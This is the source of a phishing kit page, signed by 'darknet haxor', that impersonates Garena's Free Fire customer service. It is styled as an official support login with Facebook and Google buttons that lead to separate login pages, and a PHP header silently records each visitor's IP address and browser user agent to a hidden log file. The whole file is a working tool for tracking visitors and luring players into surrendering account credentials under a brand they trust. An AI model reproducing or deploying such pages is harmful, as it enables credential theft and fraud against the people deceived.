<!-- DARKNET HAXOR:
________ _______ ________ ______ _______   ____________________ 
___  __ \___    |___  __ \___  //_/___  | / /___  ____/___  __/ 
__  / / /__  /| |__  /_/ /__  ,<   __   |/ / __  __/   __  /    
_  /_/ / _  ___ |_  _, _/ _  /| |  _  /|  /  _  /___   _  /     
/_____/  /_/  |_|/_/ |_|  /_/ |_|  /_/ |_/   /_____/   /_/     

______  _________ ____  _________ ________                     
___  / / /___    |__  |/ /__  __ \___  __ \                    
__  /_/ / __  /| |__    / _  / / /__  /_/ / 
_  __  /  _  ___ |_    |  / /_/ / _  _, _/  
/_/ /_/   /_/  |_|/_/|_|  \____/  /_/ |_| 
------------------------------------------------------------    
Author   : darknet haxor 
Telegram : https://t.me/officialdarknethaxor
------------------------------------------------------------>
<?php
error_reporting(0);
ini_set('display_errors', 0);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }

$useragent = $_SERVER['HTTP_USER_AGENT'];
$data = "==1{$ipaddress}== ==2{$useragent}== ==3Free Fire==";
$sendhits = "../../view.txt";
$x = fopen($sendhits, "a+");
fwrite($x, $data);
fclose($x);
?>
<html lang="sg_en" style="font-size: 102.324px; height: 969px; width: 1365px;"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"><title>Zendesk Login Site</title><link rel="shortcut icon" type="image/png" href="favicon.png"><link href="static/css/main.ae76d67acf37435e83b9.css" rel="stylesheet"></head><body><div id="app"><div class="content"><div class="home-background"></div> <div class="ff-logo"></div> <div class="container"><div class="title">FF CUSTOMER SERVICE</div> <div class="subtitle">Please login to your Free Fire account</div> <div class="options"><a href="flogin.php"><button class="btn-facebook"></button></a> <button class="btn-vk"></button> <a href="glogin.php"><button class="btn-google"></button></a> <button class="btn-huawei"></button> <button class="btn-apple"></button> <button class="btn-twitter"></button></div> <div class="link">
    Ensure that you link your Free Fire account to be able to submit a
    ticket
  </div></div> <div class="note">
  *Our support is limited to and will only entertain requests in English
  Language.
</div> <footer><div class="garena"></div> <div class="copyright"><p>Copyright © Garena International.</p> <p>
      Trademarks belong to their respective owners. All rights Reserved.
    </p></div></footer></div> <div class="v-portal" style="display: none;"></div></div><script type="text/javascript" src="static/js/vendors~main.49c73d28a219dfe919b3.jss"></script><script type="text/javascript" src="static/js/main.6c5df6dee952ffdf0926.jss"></script><div class="vue-portal-target"><!----></div></body></html>